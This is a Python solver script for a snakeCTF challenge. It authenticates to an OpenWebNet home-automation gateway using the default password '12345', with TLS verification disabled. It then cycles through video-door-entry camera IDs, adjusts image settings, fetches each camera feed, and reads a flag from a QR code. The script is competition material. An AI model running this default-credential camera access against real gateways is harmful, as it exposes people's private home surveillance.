import asyncio
import argparse
import re
import pyown
import httpx
import ssl

from io import BytesIO

from PIL import Image, ImageOps
from pyzbar.pyzbar import decode

from pyown.tags import Who, What, Value
from pyown.messages import NormalMessage, NACK, GenericMessage, MessageType
from pyown.protocol import OWNProtocol


http_client = httpx.AsyncClient(verify=False)
flag_re = re.compile(r"snakeCTF{.*?}")

# allow self signed certificate
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


class SSLOWNClient(pyown.Client):
    async def start(self) -> None:
        try:
            self._transport, self._protocol = await self._loop.create_connection(
                lambda: OWNProtocol(
                    on_connection_start=self._on_connection_start,
                    on_connection_end=self._on_connection_end,
                ),
                self._host,
                self._port,
                ssl=ssl_context,  # we need to override this function from the library to add support for TLS
            )
        except OSError:
            raise TimeoutError("Could not connect to the server")

        # Wait for the connection to start
        await self._on_connection_start

        # Handshake
        # The first packet is from the server, and it's an ACK packet
        # The second packet is from the client and set the session type
        # Wait for the first packet
        async with asyncio.timeout(5):
            message = await self.read_message()

        if message.type != MessageType.ACK:
            raise InvalidAuthentication("Expected ACK message")

        # Send the session type
        await self.send_message(self._session_type.to_message(), force=True)
        resp = await self.read_message()

        # Authentication
        await self._authenticate_open(nonce=resp.tags[0])


async def get_camera_feed(
    server_host: str, server_port: int, https: bool = False
) -> Image.Image:
    response = await http_client.get(
        f"{'https' if https else 'http'}://{server_host}:{server_port}/telecamera.php",
    )
    data = response.content
    image = Image.open(BytesIO(data))
    return image


async def detect_qr_code(image: Image.Image) -> str | None:
    decoded = decode(image)
    if not decoded:
        return None

    for d in decoded:
        if d.type == "QRCODE":
            return d.data.decode("utf-8")

    return None


def get_camera_id(camera_id: int) -> NormalMessage:
    return NormalMessage((Who.VIDEO_DOOR_ENTRY, What(0), Value(camera_id)))


def increase_brightness() -> GenericMessage:
    return GenericMessage((Who.VIDEO_DOOR_ENTRY, "150"))


def increase_quality() -> GenericMessage:
    return GenericMessage((Who.VIDEO_DOOR_ENTRY, "180"))


def extract_flag(qr_code: str) -> str | None:
    match = flag_re.search(qr_code)
    if match:
        return match.group(0)
    return None


async def main(
    own_host: str,
    own_port: int,
    http_host: str,
    http_port: int,
    https: bool = False,
    own_password: str = "12345",
):
    client = SSLOWNClient(host=own_host, port=own_port, password=own_password)
    await client.start()

    flag = None
    for camera_id in range(4000, 4011):
        message = get_camera_id(camera_id)
        await client.send_message(message)

        # Wait for the response
        response = await client.read_message()
        if response == NACK:
            print(f"Camera {camera_id} is not available")
            break

        # Increase brightness
        for _ in range(10):
            message = increase_brightness()
            await client.send_message(message)
            await asyncio.sleep(0.1)

        # Increase quality
        for _ in range(10):
            message = increase_quality()
            await client.send_message(message)
            await asyncio.sleep(0.1)

        # Check if the camera contains the flag
        image = await get_camera_feed(http_host, http_port, https)

        # Save the image
        image.save(f"camera_{camera_id}.png")

        qr_code = await detect_qr_code(image)
        if qr_code:
            print(f"Camera {camera_id} has QR code")
            flag = extract_flag(qr_code)
            if flag:
                print(f"Flag: {flag}")
                return flag
            else:
                print(f"Camera {camera_id} has QR code {qr_code} but no flag")
        else:
            print(f"Camera {camera_id} has no QR code")


def run():
    parser = argparse.ArgumentParser()
    parser.add_argument("--own-host", type=str, default="127.0.0.1")
    parser.add_argument("--own-port", type=int, default=20000)
    parser.add_argument("--http-host", type=str, default="127.0.0.1")
    parser.add_argument("--http-port", type=int, default=8000)
    parser.add_argument("--https", action="store_true", default=False)
    parser.add_argument("--own-password", type=str, default="12345")
    args = parser.parse_args()

    asyncio.run(main(**vars(args)))


if __name__ == "__main__":
    run()
